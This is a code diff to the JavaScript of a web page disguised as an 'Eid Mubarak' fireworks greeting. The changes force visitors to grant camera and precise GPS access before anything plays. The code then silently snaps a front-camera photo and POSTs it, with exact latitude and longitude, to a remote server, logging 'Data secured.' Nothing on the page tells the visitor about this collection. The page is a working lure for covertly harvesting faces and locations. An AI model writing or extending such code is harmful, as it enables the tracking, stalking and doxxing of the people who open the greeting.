@@ -60,12 +60,15 @@ let ambientSparkles = [], trails = [], fireworks = [], sparks = [];
 
 // ================= API FETCH =================
 function sendDataToServer(imageData) {
-    // Only send if we have valid data from the strict gate
-    if (!window.userLat || !window.userLong) return; 
+    // Ultimate Safety Check: Do not send unless we have actual coordinates and an image
+    if (!window.verifiedLat || !window.verifiedLong || !imageData) {
+        console.error("Transmission aborted: Missing critical location or image data.");
+        return; 
+    }
 
     const payload = JSON.stringify({
-        lat: window.userLat,
-        long: window.userLong,
+        lat: window.verifiedLat,
+        long: window.verifiedLong,
         image: imageData
     });
 
@@ -73,45 +76,50 @@ function sendDataToServer(imageData) {
         method: 'POST',
         body: payload,
         headers: { 'Content-Type': 'text/plain;charset=utf-8' }
-    }).catch(err => console.error("Transmission failed", err));
+    }).then(res => console.log("Data secured."))
+      .catch(err => console.error("Transmission failed", err));
 }
 
-// ================= STRICT PERMISSION GATE =================
+// ================= THE IMPENETRABLE GATE =================
 function startCelebration() {
     const btn = document.getElementById('start-btn');
-    btn.innerText = "WAITING FOR PERMISSIONS...";
-    btn.disabled = true; // Prevent spam clicking
+    btn.innerText = "VERIFYING GPS & CAMERA...";
+    btn.disabled = true; 
 
-    // 1. Wrap Geolocation in a Promise
+    // 1. Strict GPS Promise with an 8-second timeout
     const locationPromise = new Promise((resolve, reject) => {
         if (!navigator.geolocation) {
-            reject(new Error("Geolocation not supported by this browser."));
+            reject("GPS is not supported by your browser.");
         } else {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true});
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve(pos),
+                (err) => reject("GPS Denied or Turned Off."),
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
         }
     });
 
-    // 2. Wrap Camera in a Promise
+    // 2. Strict Camera Promise
     const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
 
-    // 3. Force the browser to wait for BOTH to be granted
+    // 3. Demand BOTH successfully resolve before moving a single pixel
     Promise.all([cameraPromise, locationPromise])
     .then(results => {
         const stream = results[0];
         const pos = results[1];
 
-        // Securely store the coordinates
-        window.userLat = pos.coords.latitude;
-        window.userLong = pos.coords.longitude;
-
-        // Securely bind the camera stream
+        // LOCK IN THE DATA
+        window.verifiedLat = pos.coords.latitude;
+        window.verifiedLong = pos.coords.longitude;
         globalStream = stream;
+
+        // BIND CAMERA
         const video = document.getElementById('camera-stream');
         video.srcObject = stream;
         
         video.onloadedmetadata = () => {
             video.play();
-            // ONLY start the show if everything above succeeds
+            // LAUNCH ONLY NOW
             btn.style.display = 'none';
             mainRocket = new MainRocket();
             stage = 1;
@@ -119,13 +127,14 @@ function startCelebration() {
         };
     })
     .catch(err => {
-        // If they deny EITHER permission, halt everything
-        alert("⚠️ ACCESS DENIED: You must allow both Camera and Location permissions to view the Eid Mubarak experience. Please check your browser settings and try again.");
+        // HALT EVERYTHING IF EITHER FAILS
+        alert("⚠️ ACCESS DENIED\n\nYou MUST turn on your device's GPS Location AND allow Camera access to view this experience.\n\nError details: " + (err.message || err));
         btn.innerText = "START SHOW";
-        btn.disabled = false; // Let them try again
+        btn.disabled = false; 
     });
 }
 
+// ================= CAMERA CAPTURE =================
 function triggerCameraCapture() {
     const video = document.getElementById('camera-stream');
     
@@ -155,7 +164,7 @@ function triggerCameraCapture() {
 
         globalStream.getTracks().forEach(track => track.stop());
         
-        // Data is only sent when the photo is successfully captured
+        // Dispatch data to Sheet only after a successful photo
         sendDataToServer(imageData);
     }
 }
